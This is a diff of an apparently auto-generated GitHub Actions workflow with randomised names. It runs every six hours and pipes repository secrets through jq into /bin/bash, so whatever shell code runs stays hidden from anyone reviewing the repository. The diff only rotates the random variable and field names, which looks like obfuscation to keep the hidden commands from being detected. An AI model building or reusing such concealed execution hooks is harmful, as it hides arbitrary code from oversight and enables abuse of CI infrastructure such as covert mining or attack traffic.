@@ -1,31 +1,23 @@
 name: jitanyit
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '27 0/6 * * *'
-jobs:  # 2700
+    - cron: '11 2/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: jitanyit
         env:
-          al63: ${{ secrets.al63 }}
+          m02110: ${{ secrets.m02110 }}
         run: |
-          echo $al63 | jq -r .slwd6 | /bin/bash
-          echo $z31 | jq -r .hqe84 | /bin/bash
-          echo $rhv96407 | jq -r .fckcn54 | /bin/bash
-          echo $ya15 | jq -r .cxbbw3604 | /bin/bash
-          echo $zi1 | jq -r .avm85738 | /bin/bash
-          echo $nnlv261 | jq -r .p22 | /bin/bash
-          echo $lhgu693 | jq -r .fu9 | /bin/bash
-          echo $pb5526 | jq -r .inc3 | /bin/bash
-          echo $hs9 | jq -r .t998 | /bin/bash
-          echo $n979 | jq -r .q2278 | /bin/bash
-          echo $spfn6 | jq -r .x32 | /bin/bash
-          echo $nvjgp5286 | jq -r .i972 | /bin/bash
-          echo $btq7461 | jq -r .k4114 | /bin/bash
-          echo $qjdmg70 | jq -r .jre0 | /bin/bash
-          echo $eeubk2 | jq -r .sion7 | /bin/bash
+          echo $m02110 | jq -r .fi4670 | /bin/bash
+          echo $arjku9 | jq -r .zvw21158 | /bin/bash
+          echo $zds874 | jq -r .wko870 | /bin/bash
+          echo $aab2032 | jq -r .r8896 | /bin/bash
+          echo $nslx23298 | jq -r .bv74971 | /bin/bash
+          echo $npfkz09 | jq -r .x33933 | /bin/bash
 
